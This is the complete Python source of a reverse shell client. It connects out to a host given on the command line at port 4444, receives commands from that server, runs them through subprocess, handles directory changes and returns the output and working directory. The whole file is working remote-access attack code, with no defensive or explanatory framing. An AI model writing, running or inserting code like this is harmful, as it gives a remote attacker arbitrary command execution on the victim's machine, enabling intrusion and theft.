import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 4444
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free  to increase

# separator string for sending 2 messages in one go

SEPARATOR = "<sep>"

# create socket object

s = socket.socket()

# connect to server

s.connect((SERVER_HOST, SERVER_PORT))

# get current working directory

cwd = os.getcwd()
s.send(cwd.encode())

# This is the main loop. We are first going to receive the command from the server, execute it and send the result back:

while True:
        # receive command from server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
                # if command is exit,  then break out of loop
                break
        if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                        os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                        # if the is an error, set the output as
                        output = str(e)
                else:
                        # if the operation is successful, empty message
                        output = ""
        else:
                # execute command and retrive results
                output = subprocess.getoutput(command)
        # get current working diretcory as output
        cwd = os.getcwd()
        # send the results back to server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
# close client connection
s.close()
